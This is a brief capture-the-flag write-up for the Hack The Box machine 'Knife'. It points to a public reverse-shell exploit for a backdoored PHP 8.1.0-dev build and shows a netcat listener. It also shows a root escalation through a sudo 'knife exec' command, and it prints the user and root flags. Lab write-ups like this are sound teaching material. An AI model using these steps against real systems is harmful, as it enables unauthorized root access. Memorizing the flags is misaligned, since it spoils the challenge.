---
title: "Knife from HTB"
categories: [Hack The Box]
tags: [Hack The Box]
---
# Knife from HTB
site uses `php 8.1.0`which is exploitable. Code for reverse shell is available in this `github repository`
https://github.com/flast101/php-8.1.0-dev-backdoor-rce/blob/main/revshell_php_8.1.0-dev.py
execute that script and you will get `reverse shell`
***
User Flag is: c34d0950352a6c385a671f54eeeee9bc
***
After running `linpeas`we find this
```
Matching Defaults entries for james on knife:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User james may run the following commands on knife:
    (root) NOPASSWD: /usr/bin/knife
```
then i found this
https://gtfobins.github.io/gtfobins/knife/
we can do `privilege escaltion with this`
```
james@knife:/$ python3 -c 'import pty;pty.spawn("/bin/bash")'
python3 -c 'import pty;pty.spawn("/bin/bash")'
james@knife:/$
zsh: suspended  rlwrap nc -nvlp 1234

stty raw -echo;fg
[1]  + continued  rlwrap nc -nvlp 1234
james@knife:/$ export TERM=xterm
export TERM=xterm
james@knife:/$ sudo knife exec -E 'exec "/bin/sh"'
sudo knife exec -E 'exec "/bin/sh"'
#
```
****
Root Flag is: dc9bc9b178e4e2b8001667b559a2d479
***
![screen](/assets/images/2024-09-01_21-22-26.png)
